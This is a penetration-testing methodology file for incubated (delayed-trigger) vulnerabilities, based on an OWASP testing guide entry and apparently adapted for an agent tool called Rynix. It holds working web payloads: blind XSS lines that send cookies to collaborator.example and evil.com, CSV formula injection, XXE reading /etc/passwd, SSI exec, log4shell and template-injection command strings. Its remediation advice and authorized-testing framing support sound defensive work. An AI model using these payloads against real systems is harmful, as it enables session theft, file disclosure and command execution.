---
id: WSTG-INPV-14
title: Testing for Incubated Vulnerabilities
category: Input Validation
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerabilities
---

# WSTG-INPV-14: Testing for Incubated Vulnerabilities

## Summary

Incubated vulnerabilities are attacks where a malicious payload is stored in the application and triggered later -- potentially by a different user, a background process, an administrative action, or a time-delayed mechanism. Unlike immediate stored XSS or direct injection attacks, incubated vulnerabilities have a delayed trigger that makes them harder to detect and trace. The payload may "incubate" in a database, file system, message queue, log file, or email system before being activated by a separate workflow. Examples include payloads in user registration data that trigger when an admin reviews accounts, log file injection that triggers when logs are viewed in a web interface, and time-bomb payloads in scheduled reports.

## Test Objectives

- Identify stored input vectors whose data is consumed by different users or processes
- Test if payloads injected through one workflow are triggered through another
- Determine the time delay and trigger conditions for incubated attacks
- Assess the impact when payloads are executed in privileged contexts (e.g., admin panels)

## Prerequisites

- Target application stores user input that is later processed or viewed by other users/processes
- Understanding of application workflows (data submission, approval, reporting, logging)
- Docker pentest container capturing traffic
- At least one test account for submitting payloads
- Ideally, access to (or knowledge of) administrative views and background processes

## Test Steps

### Step 1: Map Data Flow and Delayed Processing Paths

**CLI Actions:**
1. Use `curl` to identify all endpoints where user data is submitted and stored
2. Use `curl` with pattern `(submit|create|register|upload|comment|feedback|report|log|queue|schedule)` to find storage endpoints
3. Map which stored data is later consumed by:
   - Admin panels / moderation interfaces
   - Report generation systems
   - Email notification systems
   - Log viewers / analytics dashboards
   - Export features (CSV, PDF, XML)
   - Background jobs / scheduled tasks
   - API responses consumed by other services
4. Use `save to manual-review file` for each input endpoint

### Step 2: Inject Payloads via User Registration/Profile

**CLI Actions:**
Use `curl` to inject payloads into user registration or profile fields that administrators will later review:

```
POST /api/register HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "<img src=x onerror=fetch('https://collaborator.example/steal?c='+document.cookie)>",
  "email": "test@example.com",
  "name": "Normal User",
  "bio": "<script src=https://collaborator.example/hook.js></script>"
}
```

```
POST /api/profile HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "company": "Test</td><script>alert('XSS')</script><td>",
  "phone": "555-0123\"><script>alert('XSS')</script>"
}
```

These payloads incubate until an admin views the user management panel.

### Step 3: Inject Payloads via Log Files

**CLI Actions:**
User input that gets logged (User-Agent, Referer, failed login attempts) can be triggered when an admin views logs. Use `curl`:

**User-Agent injection:**
```
GET /page HTTP/1.1
Host: target.com
User-Agent: <script>alert('XSS-via-logs')</script>
```

**Failed login with injected username:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=<script>alert('XSS')</script>&password=anything
```

**Referer injection:**
```
GET /page HTTP/1.1
Host: target.com
Referer: https://evil.com/<script>alert('XSS')</script>
```

### Step 4: Inject Payloads via Feedback/Support Systems

**CLI Actions:**
Use `curl` to inject payloads that will be viewed by support staff:

```
POST /api/support/ticket HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "subject": "Help with my account",
  "message": "Hello, I need help. <img src=x onerror=fetch('https://collaborator.example/admin?c='+document.cookie)>",
  "priority": "high"
}
```

```
POST /api/feedback HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "rating": 5,
  "comment": "Great service! <!--#exec cmd=\"id\"-->"
}
```

### Step 5: Test Payloads in Export and Report Generation

**CLI Actions:**
Data that is exported to CSV, PDF, or XML may interpret injected payloads. Use `curl` to inject:

**CSV injection (formula injection):**
```
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "name": "=cmd|'/C calc.exe'!A1",
  "description": "+cmd|'/C calc.exe'!A1"
}
```

**PDF generation injection:**
```
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "name": "<iframe src='https://evil.com'></iframe>",
  "description": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
}
```

Then trigger the export:
```
GET /api/export/csv HTTP/1.1
Host: target.com
```

```
GET /api/report/generate?format=pdf HTTP/1.1
Host: target.com
```

### Step 6: Test Time-Delayed and Scheduled Triggers

**CLI Actions:**
Use `curl` to inject payloads that trigger on scheduled tasks:

**Scheduled email reports:**
```
POST /api/settings/report HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "report_name": "<script>alert('XSS')</script>Daily Report",
  "schedule": "daily",
  "recipients": ["admin@target.com"]
}
```

**Cron job or batch processing input:**
```
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---boundary

-----boundary
Content-Disposition: form-data; name="file"; filename="data.xml"
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>
-----boundary--
```

### Step 7: Verify Payload Trigger and Impact

**CLI Actions:**
1. After injection, wait for the expected trigger condition (admin review, report generation, log rotation)
2. If you have access to the admin interface, use `curl` to access the admin views that display the stored data
3. Use `curl` to monitor for any outbound requests to collaborator domains
4. Use `rynix_plugin_run('template-scan')` to check for stored/blind XSS findings
5. Document the time delay between injection and trigger

## Payloads

### Blind XSS Payloads (for Admin Panels)
```
"><script src=https://collaborator.example/hook.js></script>
<img src=x onerror=fetch('https://collaborator.example/steal?c='+document.cookie)>
<svg onload=fetch('https://collaborator.example/admin?url='+location.href)>
<input onfocus=fetch('https://collaborator.example/xss') autofocus>
<details open ontoggle=fetch('https://collaborator.example/trigger')>
```

### Log Injection Payloads
```
<script>alert('log-xss')</script>
\r\nInjected-Header: value
%0d%0aFake-Log-Entry: CRITICAL - unauthorized access detected
${jndi:ldap://collaborator.example/log4shell}
```

### CSV/Formula Injection Payloads
```
=cmd|'/C calc.exe'!A1
+cmd|'/C calc.exe'!A1
-cmd|'/C calc.exe'!A1
@SUM(1+1)*cmd|'/C calc.exe'!A1
=HYPERLINK("https://evil.com/steal?data="&A1,"Click")
=IMPORTXML("https://evil.com/steal","/")
```

### Email Template Injection Payloads
```
<img src=x onerror=alert('XSS')>
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}
${7*7}
<a href="javascript:alert('XSS')">Click here</a>
```

### XML/XXE Payloads for Batch Processing
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://collaborator.example/xxe">]><data>&xxe;</data>
```

### SSI Payloads for Log Files
```
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
<!--#echo var="DOCUMENT_ROOT"-->
```

### Time-Bomb Payloads
```
<script>if(new Date().getHours()>17)fetch('https://collaborator.example/afterhours?c='+document.cookie)</script>
<script>if(document.domain.includes('admin'))fetch('https://collaborator.example/admin?c='+document.cookie)</script>
```

## Detection Criteria

A finding should be logged when:
- Payloads injected through one workflow execute in a different workflow context
- Blind XSS callbacks are received from admin panels or internal tools
- Formula injection payloads are processed by spreadsheet applications on export
- Log file injection payloads execute when logs are viewed through a web interface
- Delayed triggers confirm the payload survived storage and re-rendering

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Blind XSS executes in admin panel, stealing admin session | Critical |
| Incubated payload achieves RCE via backend processing | Critical |
| Stored payload triggers in privileged context (admin, moderator) | High |
| CSV/formula injection executes on client machines during export | High |
| Log injection payload executes in log viewer | Medium |
| Payload stored and rendered but limited to self-XSS context | Medium |
| Payload stored but sanitized on all output contexts | Low |

## Remediation

- Apply output encoding consistently in ALL contexts where stored data is rendered (admin panels, reports, logs, exports, emails)
- Sanitize user input on storage AND on output (defense in depth)
- Use Content-Security-Policy headers on all pages, including admin interfaces
- Prefix CSV cell values with a single quote to prevent formula injection
- Validate and sanitize data in background processing jobs
- Implement blind XSS detection in development (e.g., XSS Hunter)
- Use structured logging that does not interpret HTML/SSI in log entries
- Apply the same security controls to admin/internal tools as public-facing pages
- Review all data paths from input to output for consistent encoding

## References

- [OWASP Testing Guide - Incubated Vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerabilities)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

